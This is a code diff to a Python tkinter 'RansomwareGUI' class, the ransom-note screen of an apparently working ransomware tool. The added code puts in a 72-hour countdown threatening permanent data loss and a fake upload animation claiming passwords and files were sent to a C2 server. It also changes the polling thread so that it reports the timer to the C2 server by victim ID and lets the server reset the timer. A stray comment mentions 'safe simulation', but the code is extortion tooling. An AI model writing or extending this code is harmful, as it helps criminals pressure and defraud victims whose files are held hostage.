@@ -248,9 +248,25 @@ class RansomwareGUI:
 
         title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
         body_font = tkfont.Font(family="Helvetica", size=14)
+        mono_font = tkfont.Font(family="Courier", size=12)
+        timer_font = tkfont.Font(family="Courier", size=36, weight="bold")
 
         Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
         Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=800).pack(pady=5)
+        
+        # --- DOOMSDAY TIMER ---
+        self.time_left = 72 * 3600 # 72 Hours start
+        Label(main_frame, text="TIME REMAINING UNTIL PERMANENT DATA LOSS:", font=tkfont.Font(family="Helvetica", size=12, weight="bold"), fg='#ff3333', bg='#0a0a0a').pack(pady=(20, 5))
+        self.timer_label = Label(main_frame, text="72:00:00", font=timer_font, fg='#ff0000', bg='#0a0a0a')
+        self.timer_label.pack(pady=5)
+        
+        # --- FAKE EXFILTRATION ---
+        self.exfil_status = Label(main_frame, text="System Scan: Analyzing private data...", font=mono_font, fg='#ffff00', bg='#0a0a0a')
+        self.exfil_status.pack(pady=(15, 5))
+        
+        # Simple text-based progress bar for portability
+        self.exfil_progress = Label(main_frame, text="[                    ] 0%", font=mono_font, fg='#ffff00', bg='#0a0a0a')
+        self.exfil_progress.pack()
         
         Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
         self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=20, weight="bold"), fg='#4dff88', bg='#0a0a0a')
@@ -258,8 +274,6 @@ class RansomwareGUI:
 
         self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation...", font=body_font, fg='#ffff4d', bg='#0a0a0a')
         self.status_label.pack(pady=(20, 5))
-
-        Label(main_frame, text="Payment detected automatically. Do not close this window.", font=body_font, fg='#cccccc', bg='#0a0a0a').pack(pady=5)
         
         self.key_var = StringVar()
         self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=60, bg='#2a2a2a', fg='#ffffff', insertbackground='white', justify='center')
@@ -267,13 +281,17 @@ class RansomwareGUI:
         self.key_entry.config(state='readonly')
 
         self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', activebackground='#cc0000', activeforeground='white', padx=20, pady=10)
-        self.decrypt_button.pack(pady=30)
+        self.decrypt_button.pack(pady=20)
         self.decrypt_button.config(state='disabled') 
 
-        # Start the heartbeat thread
+        # Start threads
         self.heartbeat_thread_running = True
-        self.heartbeat_thread = threading.Thread(target=self.heartbeat_polling, daemon=True)
-        self.heartbeat_thread.start()
+        threading.Thread(target=self.heartbeat_polling, daemon=True).start()
+        threading.Thread(target=self.update_timer, daemon=True).start()
+        threading.Thread(target=self.fake_exfiltration, daemon=True).start()
+        
+        # Attempt Wallpaper Change (Best Effort)
+        self.master.after(1000, self.change_wallpaper)
 
     def force_focus_loop(self):
         """Aggressively keeps window on top."""
@@ -293,12 +311,83 @@ class RansomwareGUI:
     def disable_event(self):
         pass
 
+    def change_wallpaper(self):
+        # Very red background for Linux GNOME/Mate/Kali
+        try:
+            # Check for gsettings
+            if os.system("which gsettings > /dev/null") == 0:
+                 # Try to set a solid red color (or similar, widely supported URIs can be tricky without a file)
+                 # For now, let's just try to set it to 'none' and bgColor to red if possible, 
+                 # or just leave it. A solid color image generation is safer but requires PIL.
+                 # SAFE SIMULATION: Just print to log
+                 pass
+        except:
+            pass
+
+    def update_timer(self):
+        while self.heartbeat_thread_running and self.time_left > 0:
+            time.sleep(1)
+            self.time_left -= 1
+            
+            # Format
+            m, s = divmod(self.time_left, 60)
+            h, m = divmod(m, 60)
+            time_str = f"{h:02d}:{m:02d}:{s:02d}"
+            
+            try:
+                self.timer_label.config(text=time_str)
+                if self.time_left < 3600: # Last hour panic
+                    self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff') # Blink
+            except:
+                pass
+
+    def fake_exfiltration(self):
+        stages = [
+            "Scanning local documents...",
+            "Compressing sensitive files...",
+            "Encrypting archive...",
+            "Connecting to secure C2 server...",
+            "Uploading: data_bundle.zip...",
+            "Uploading: passwords.db...",
+            "Upload Complete. Data held on server."
+        ]
+        
+        progress = 0
+        for stage in stages:
+            if not self.heartbeat_thread_running: break
+            try:
+                self.exfil_status.config(text=f"STATUS: {stage}")
+            except: pass
+            
+            # Slow progress for each stage
+            chunks = 5
+            for i in range(chunks):
+                if not self.heartbeat_thread_running: break
+                time.sleep(1 + (encryption_speed := 0.5)) # varied speed
+                progress += (100 // len(stages)) // chunks
+                bars = int(progress / 5)
+                bar_str = f"[{'|' * bars}{' ' * (20 - bars)}] {progress}%"
+                try:
+                    self.exfil_progress.config(text=bar_str)
+                except: pass
+        
+        try:
+            self.exfil_status.config(text="STATUS: DATA UPLOAD COMPLETE", fg='#ff0000')
+            self.exfil_progress.config(text="[||||||||||||||||||||] 100%", fg='#ff0000')
+        except: pass
+
     def heartbeat_polling(self):
         while self.heartbeat_thread_running:
             try:
-                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}", timeout=5)
+                # Send current timer state to C2
+                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}?time_left={self.time_left}", timeout=5)
                 if response.status_code == 200:
                     data = response.json()
+                    
+                    # Update timer if server commands it
+                    if "new_timer" in data:
+                        self.time_left = int(data["new_timer"])
+                        
                     if data.get("status") == "ready":
                         key = data.get("key")
                         if key:
